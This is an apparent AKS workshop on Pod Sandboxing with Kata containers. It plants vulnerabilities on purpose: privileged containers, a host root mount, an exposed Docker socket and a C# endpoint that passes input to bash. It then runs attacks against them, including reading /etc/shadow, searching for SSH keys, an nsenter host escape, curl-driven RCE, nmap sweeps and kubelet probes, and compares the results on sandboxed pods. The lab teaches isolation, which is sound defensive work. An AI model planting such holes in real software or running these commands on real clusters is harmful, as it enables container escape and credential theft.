---
sidebar_position: 
title: Pod Sandboxing on AKS
sidebar_label: "Pod Sandboxing"
---

Pod Sandboxing on AKS, currently in Public Preview, provides an isolation boundary between the container application and the shared kernel and compute resources of the container host such as CPU, memory, and networking. 

Traditionally, Kubernetes deployments rely on namespace isolation. Namespaces don't protect against kernel-level attacks, because:

- All containers share the same kernel.
- vulnerability in the kernel (e.g., dirty COW, runc escape, Spectre/Meltdown side channels) can allow cross-container attacks.
- If a container escapes its namespace, it could compromise other containers or the host.

This is especially risky in multi-tenant clusters, where:

- One tenant’s workload might be malicious or compromised.
- Traditional namespace isolation won't stop a kernel-level exploit from jumping across tenants.

Kata Containers are ideal when you need strong tenant isolation—for example:

- SaaS platforms with untrusted workloads
- Regulated environments (e.g., finance, healthcare)
- Running low-trust 3rd-party code
- Clusters with shared responsibility models

## Objectives

Pod Sandboxing on AKS is currently in Public Preview.
This session is designed to help you understand how to isolate workloads using the lightweight Kata virtual machines introduced by Pod Sandboxing. The goal is to allow you to get hands-on with the feature and different use cases in a clusters.

As you progress through the workshop, you will learn how to:

- Set up a workplace environment
- Deploying pods (Kata and non-Kata)
- Explore resource isolation between Kata pods and non-Kata pods
- Set resource constraints on Kata pods

## Prerequisites

Before starting this lab, please ensure your lab environment is set up properly. Follow the guide [here](https://azure-samples.github.io/aks-labs/docs/getting-started/setting-up-lab-environment/).

Please also familiarize yourself with the basic concepts laid out, and ensure you have the prerequisites laid out in the Microsoft Learn page for [Pod Sandboxing on AKS](https://learn.microsoft.com/en-us/azure/aks/use-pod-sandboxing).

## Setting up Pod Sandboxing on your AKS Node Pool(s)

You can either spin up a new cluster or add node pools to an existing cluster to experiment with the Pod Sandboxing feature.

## Deploy a new cluster

If you want to deploy a new AKS cluster with Pod Sandboxing enabled, you can simply call on `az aks create` to create a new cluster. When setting up the clusters, however, please specify the following parameters:

- `--workload-runtime`: Should be `KataMshvVmIsolation` to enable the Pod Sandboxing feature in the node pool. With this parameter selected, the subsequent two parameters must fit the requirements, or else an error will be returned.
- `--os-sku`: Ensure you select `AzureLinux`, as that is the only OS that supports this feature currently.
- `--node-vm-size`: Please ensure you select a VM size that both supports generation 2 VMs and nested virtualization. The [Dsv3 series](https://learn.microsoft.com/en-us/azure/virtual-machines/sizes/general-purpose/dsv3-series?tabs=sizebasic) of VMs are a great example.

Here is an example of a command that will create a cluster, *myAKSCluster*, with 1 node in *myResourceGroup*:

```azurecli-interactive
az aks create
    --name myAKSCluster \
    --resource-group myResourceGroup \
    --os-sku AzureLinux \
    --workload-runtime KataMshvVmIsolation \
    --node-vm-size Standard_D4s_v3 \
    --node-count 1 \
    --generate-ssh-keys
```

Once the cluster is created, ensure you get the access credentials for the Kubernetes cluster.

```azurecli-interactive
az aks get-credentials --resource-group myResourceGroup --name myAKSCluster
```

## Deploy to an existing cluster

The prerequisites above also apply if you intend to deploy Pod Sandboxing to an existing cluster. The difference is instead of creating a cluster via `az aks create`, you will simply add node pools to an existing cluster using `az aks nodepool add`. The parameter requirements laid out above remain the same.

In order to demonstrate the difference between Kata and non-Kata pods, we will deploy multiple pods, both with Pod Sandboxing enabled and disabled.

This example adds a node pool to *myAKSCluster* with one node pool, *nodepool2* in *myResourceGroup*:

```azurecli
az aks nodepool add \
    --cluster-name myAKSCluster \
    --resource-group myResourceGroup \
    --name nodepool2 \ 
    --os-sku AzureLinux \ 
    --workload-runtime KataMshvVmIsolation \
    --node-vm-size Standard_D4s_v3
```


# Demonstrating compute/network isolation

## Deploying your pods

In order to demonstrate the usefulness of resource isolation, we will deploy applications to the same node pool, only enabling Pod Sandboxing on a subset of applications.

For the purposes of the demo, we will deploy a sample Contoso projects on AKS: [Contoso Ship Manager](https://github.com/Azure-Samples/aks-contoso-ships-sample).

<!--
I think there is already image on ACR
```azurecli
git clone https://github.com/Azure-Samples/aks-contoso-ships-sample.git
cd contoso-ships

```
-->
```azurecli
kubectl create deployment contoso-air \
--image=mcr.microsoft.com/oss/nginx/nginx:1.15.5-alpine \
--port=3000 \
--dry-run=client \
--output yaml > manifests/contoso-air-deployment.yaml
```

Now we deploy resources with kubectl
```azurecli
kubectl apply -f manifests/contoso-air-deployment.yaml
```

### Deploying sandboxed pods

To deploy the same Contoso Ship Manager application with Pod Sandboxing enabled, we need to modify the deployment to include the `runtimeClassName`. First, let's create a sandboxed version of our deployment YAML:

```azurecli
kubectl create deployment contoso-air-sandboxed \
--image=mcr.microsoft.com/oss/nginx/nginx:1.15.5-alpine \
--port=3000 \
--dry-run=client \
--output yaml > manifests/contoso-air-sandboxed-deployment.yaml
```

Now edit the generated YAML file to add the Pod Sandboxing runtime class. The key addition that enables Pod Sandboxing is the `runtimeClassName: kata-mshv-vm-isolation` in the pod template spec:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: contoso-air-sandboxed
  labels:
    app: contoso-air-sandboxed
spec:
  replicas: 1
  selector:
    matchLabels:
      app: contoso-air-sandboxed
  template:
    metadata:
      labels:
        app: contoso-air-sandboxed
    spec:
      runtimeClassName: kata-mshv-vm-isolation  # This enables Pod Sandboxing
      containers:
      - name: contoso-ship-manager
        image: mcr.microsoft.com/oss/nginx/nginx:1.15.5-alpine
        ports:
        - containerPort: 3000
        resources:
          requests:
            memory: "128Mi"
            cpu: "100m"
          limits:
            memory: "512Mi"
            cpu: "500m"
```

We can then go ahead and deploy our sandboxed pod:

```azurecli
kubectl apply -f manifests/contoso-air-sandboxed-deployment.yaml
```

### Verifying your pods

To verify both deployments are running, you can check the pods:

```bash
kubectl get pods -l app=contoso-air
kubectl get pods -l app=contoso-air-sandboxed
```

You can also verify whether a pod is running Kata containers by checking the runtime class of a pod:

Compare your normal pod

```bash
kubectl describe pod <normal-pod-name> | grep "Runtime Class"
```

versus that of your Kata pod

```bash
kubectl describe pod <sandboxed-pod-name> | grep "Runtime Class"
```

## Introducing Common Vulnerabilities

We will introduce some common vulnerabilities to our application and see how they compare between a normal pod and one that is sandboxed:

:::info
We will provide the patch that you can apply to the deployment. The sections below are intended as a description of the different vulnerabilities.
:::

### Run as a Privileged container
Modify your container YAMLs to include [elevated privileges](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/):
```
securityContext:
  privileged: true

```
This simulates a misconfigured container that could access host resources—something Kata Containers would block.
* Please note that Kata does not support privileged containers in preview, as host devices can't be mounted to kata pods. In order to do so, ensure you configure your containerd according to the instructions on [this page](https://github.com/kata-containers/kata-containers/blob/main/docs/how-to/privileged.md).

### Mount Host Paths
[Mount a sensitive host directory](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) that could access host resources:
```
volumeMounts:
- name: host-root
  mountPath: /host
volumes:
- name: host-root
  hostPath:
    path: /

```
This allows the container to read host files—again, blocked in sandboxed pods.

### Expose Docker Socket
Mount the Docker socket to simulate container escape:
```
spec:
  containers:
   - name: dockercontainer
     ...
     volumeMounts:
       - name: docker
         mountPath: /var/run/docker.sock

```
This would typically allow someone to break out of the container, and access other resources on the host.

### Inject a Reverse Shell
Add a vulnerable endpoint in the backend API that executes shell commands:
```
[HttpPost("exec")]
public IActionResult Exec([FromBody] string cmd)
{
    var output = System.Diagnostics.Process.Start("bash", $"-c \"{cmd}\"");
    return Ok(output);
}
```
This simulates remote code execution (RCE) from a compromised container.

## Demonstrating the impact of vulnerabilities

Once the vulnerabilities are in place, we will now demonstrate how a bad actor might attempt to utilize these vulnerabilities on non-sandboxed pods.

### Testing privileged container access

First, let's exec into a privileged container and see what host resources we can access:

```bash
# Get the pod name
kubectl get pods -l app=contoso-air

# Exec into the privileged pod
kubectl exec -it <pod-name> -- /bin/bash

# Try to access host processes
ps aux

# Try to access host filesystem
ls /host

# Check if we can see other containers' processes
cat /proc/1/cgroup
```

### Testing host path mount vulnerability

With the host path mounted, we can access sensitive host files:

```bash
# From inside the container with host mount
kubectl exec -it <pod-name> -- /bin/bash

# Access host's sensitive files
cat /host/etc/passwd
cat /host/etc/shadow

# Check for SSH keys
ls -la /host/root/.ssh/

# Look for kubernetes secrets
find /host -name "*.key" -o -name "*.crt" 2>/dev/null
```

### Testing Docker socket exposure

If the Docker socket is mounted, we can control other containers:

```bash
# From inside the container
kubectl exec -it <pod-name> -- /bin/bash

# Install docker client if not present
apt-get update && apt-get install -y docker.io

# List all containers on the host
docker ps

# Try to access other containers
docker exec -it <other-container-id> /bin/bash

# Create new containers with host privileges
docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -n -i sh
```

### Testing remote code execution

Use the vulnerable API endpoint to execute commands:

```bash
# Port forward to access the application
kubectl port-forward <pod-name> 8080:3000

# In another terminal, exploit the RCE vulnerability
curl -X POST http://localhost:8080/exec \
  -H "Content-Type: application/json" \
  -d '"cat /etc/passwd"'

# Try to access other pods' network
curl -X POST http://localhost:8080/exec \
  -H "Content-Type: application/json" \
  -d '"nmap -sn 10.244.0.0/16"'

# Attempt to access Kubernetes API
curl -X POST http://localhost:8080/exec \
  -H "Content-Type: application/json" \
  -d '"curl -k https://kubernetes.default.svc.cluster.local/api/v1/namespaces"'
```

### Demonstrating lateral movement

Show how an attacker might move between containers:

```bash
# From the compromised container, scan for other services
kubectl exec -it <pod-name> -- /bin/bash

# Network discovery
nmap -sn 10.244.0.0/16

# Try to access other pods' services
curl http://<other-pod-ip>:8080

# Attempt to access node's kubelet API
curl -k https://<node-ip>:10250/pods
```

Let's now try the same exercise on sandboxed pods.

## Deploying sandboxed pods with the same vulnerabilities

Now let's deploy the same vulnerable application but with Pod Sandboxing enabled:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: contoso-air-sandboxed
spec:
  replicas: 1
  selector:
    matchLabels:
      app: contoso-air-sandboxed
  template:
    metadata:
      labels:
        app: contoso-air-sandboxed
    spec:
      runtimeClassName: kata-mshv-vm-isolation
      containers:
      - name: contoso-air
        image: mcr.microsoft.com/oss/nginx/nginx:1.15.5-alpine
        ports:
        - containerPort: 3000
        securityContext:
          privileged: true  # Same vulnerability
        volumeMounts:
        - name: host-root
          mountPath: /host  # Same host mount
        - name: docker-socket
          mountPath: /var/run/docker.sock  # Same docker socket
      volumes:
      - name: host-root
        hostPath:
          path: /
      - name: docker-socket
        hostPath:
          path: /var/run/docker.sock
```

Deploy the sandboxed version:

```bash
kubectl apply -f manifests/contoso-air-sandboxed-deployment.yaml
```

## Testing the same vulnerabilities on sandboxed pods

Now let's repeat the same attacks and observe how Pod Sandboxing protects against them:

### Testing privileged access (BLOCKED)

```bash
# Get the sandboxed pod name
kubectl get pods -l app=contoso-air-sandboxed

# Exec into the sandboxed pod
kubectl exec -it <sandboxed-pod-name> -- /bin/bash

# Try to access host processes - you'll see only VM processes
ps aux

# The host filesystem mount will be empty or restricted
ls /host
```

### Testing host path access (BLOCKED)

```bash
# From inside the sandboxed container
kubectl exec -it <sandboxed-pod-name> -- /bin/bash

# Host files are not accessible - you're in a VM
cat /host/etc/passwd  # This will fail or show VM's passwd
find /host -name "*.key" 2>/dev/null  # No host keys visible
```

### Testing Docker socket access (BLOCKED)

```bash
# From inside the sandboxed container
kubectl exec -it <sandboxed-pod-name> -- /bin/bash

# Docker socket is not accessible from within the VM
ls -la /var/run/docker.sock  # File doesn't exist or is not functional
docker ps  # Command will fail - no docker daemon access
```
### Testing remote code execution

```bash
# Port forward to access the application
kubectl port-forward <pod-name> 8080:3000

# In another terminal, exploit the RCE vulnerability
curl -X POST http://localhost:8080/exec \
  -H "Content-Type: application/json" \
  -d '"cat /etc/passwd"'

# Try to access other pods' network
curl -X POST http://localhost:8080/exec \
  -H "Content-Type: application/json" \
  -d '"nmap -sn 10.244.0.0/16"'

# Attempt to access Kubernetes API
curl -X POST http://localhost:8080/exec \
  -H "Content-Type: application/json" \
  -d '"curl -k https://kubernetes.default.svc.cluster.local/api/v1/namespaces"'
```

### Testing lateral movement

```bash
# Network scanning from sandboxed pod shows limited scope
kubectl exec -it <sandboxed-pod-name> -- /bin/bash

# Network discovery is limited to the VM's network view
nmap -sn 10.244.0.0/16  # Limited or no results

# Should not be able to access other pods' services
curl http://<other-pod-ip>:8080

# Cannot access node's kubelet API directly
curl -k https://<node-ip>:10250/pods  # This will fail
```

### Comparing attack surfaces

Create a side-by-side comparison:

```bash
# Test from regular pod
kubectl exec -it <regular-pod> -- ps aux | wc -l

# Test from sandboxed pod  
kubectl exec -it <sandboxed-pod> -- ps aux | wc -l

# Regular pod can see many host processes, sandboxed pod sees only VM processes
```


You will notice here that:

- Host mounts fail
- Privileged mode is blocked
- Docker socket is inaccessible
- RCE is contained within the UVM

The workload and container vulnerabilities are largely isolated from one another at the individual pod level.

## Kata Isolation

Each sandboxed pod runs inside its own lightweight virtual machine (UVM), which includes its own kernel, memory, and network stack. This means that even though multiple pods may share the same subnet, their network interfaces are isolated at the virtualization layer. 

### Kernel

Each Kata pod runs inside its own lightweight VM, each with their own dedicated guest kernel. This ensures that:

- Kernel exploits in one pod do not affect another pod nor the host.
- Stronger isolation from other pods.

### Networking

Some of the key characteristics in Pod Sandboxing for networking are:

- Has its own virtual NIC (network interface card).
- Uses a separate network namespace from the host and other pods.
- Can have dedicated firewall rules, routing, and DNS settings.
- Isolated from other pods while running on same subnet.

Traffic between sandboxed pods on the same node is routed through virtual NICs and virtual switches inside the hypervisor layer. This provides strong isolation even though the subnet is shared, unless explicitly configured otherwise.

# Limitations

- Kata is currently set up utilizing a [nested virtualization](https://techcommunity.microsoft.com/blog/azure-ai-services-blog/nested-virtualization-on-azure--a-step-by-step-guide/4368074) setup, which introduces additional overhead for pod performance (e.g. network throughput, storage I/O) and startups. Users should generally expect a performance hit when compared with normal workloads.
- With the way nested virtualization is setup, peripheral devices, such as GPUs and other host devices, cannot be mounted to the Kata pod.
- Kata host-network isn't supported.

# Summary

🎉 Congratulations on completing this lab! You should now have some hands-on experience with **Pod Sandboxing** on AKS, with a solid foundation on utilizing Kata containers to isolate your workloads from one another and the host. 

## What we learned

In this lab, you:
- ✅ Set up Pod Sandboxing on AKS.
- ✅ Deployed both sandboxed and non-sandboxed pods on a cluster.
- ✅ Explored isolation provided by Pod Sandboxing.
- ✅ Simulated workload stress scenarios, and saw how Pod Sandboxing can help isolate other workloads from the fallout.
- ✅ Explored limitations of Pod Sandboxing.

## Next steps

This lab introduced **Pod Sandboxing** for compute isolation on AKS, but there are more concepts you can explore:

- Other [isolation best practices](https://learn.microsoft.com/en-us/azure/aks/operator-best-practices-cluster-isolation) on AKS
- Running a thoroughly [multi-tenant setup on AKS](https://learn.microsoft.com/en-us/azure/architecture/guide/multitenant/service/aks)
 
# Cleanup (Optional)

If you are done and no longer need the cluster(s) created during this lab, you can delete your cluster with the following command:

```azurecli-interactive
az aks delete --resource-group myResourceGroup --name myAKSCluster
```

Alternatively, if you want to keep your cluster but want to get rid of any specific pods, you can first find the pods in your cluster:

```bash
kubectl get pods
```

then delete the pod(s) in question

```bash
kubectl delete pod <pod_name>
```


